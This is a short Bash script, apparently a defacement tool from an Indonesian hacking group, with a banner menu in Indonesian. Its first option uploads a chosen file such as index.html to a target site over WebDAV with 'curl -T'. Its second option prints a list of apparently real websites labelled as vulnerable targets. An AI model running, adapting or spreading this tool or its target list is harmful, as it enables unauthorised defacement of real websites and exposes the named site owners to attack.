clear

blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'

figlet IES WEBDAV |lolcat

echo "|{×}==================================={×}|"|lolcat
echo "|Coder: MR.W4HYU                          |"|lolcat
echo "|-----------------------------------------|"|lolcat
echo "|Team   : 1.INDONESIAN ERROR SYSTEM       |"|lolcat
echo "|         2.Ies atackers                  |"|lolcat
echo "|-----------------------------------------|"|lolcat
echo "|Thanks :> IES CODER TEAM                 |"|lolcat
echo "|        > IES DEFACER                    |"|lolcat
echo "|        > IES ATACKERS                   |"|lolcat
echo "|        > STAFF                          |"|lolcat
echo "|        > Team CODER                     |"|lolcat
echo "|{×}==================================={×}|"|lolcat
echo "langsung pilih mau apa"|lolcat
echo "___________________________________________________"|lolcat
echo ""
echo  $red    "1. WebDav"
echo "___________________________________________________"|lolcat
echo ""
echo  $blue   "2. kumpulan Web Vuln "
echo "___________________________________________________"|lolcat
echo ""
echo "\033[34;1m
99\033[37;1m.\033[32;1mKeluar\033[37;1m"
echo ""
echo "\033[32;1m ──> \033[32;1m Pilih pilih aja kimak"
read -p " PILIHAN=> " pilih

if [ $pilih = 1 ]
then
clear
toilet "MR.W4HYU"
echo  "Masukin Sc nya lah ea {contoh:index.html}"|lolcat
read Sc
echo ""
echo "Link target "|lolcat
read web
curl -T /sdcard/$Sc $web
echo $blue  $web/$Sc
fi

if [ $pilih = 2 ]
then
clear
toilet $red "MR.W4HYU"
echo "http://africaprop.co.za"
echo ""
echo "http://aaglcapetown2013.org.za"
echo ""
echo "findpersonnel.co.za"
echo ""
echo "http://www.ajaxfilebrowser.com"
echo ""
echo "http://shls001.com"
echo ""
echo "http://branch.prospec.co.th"
echo ""
echo "southernafricablog.com"
echo ""
echo $red "kurang.?"
echo $blue"kunjungi website $purple http://indonesianerrorsystem.blogspot.co.id"
fi
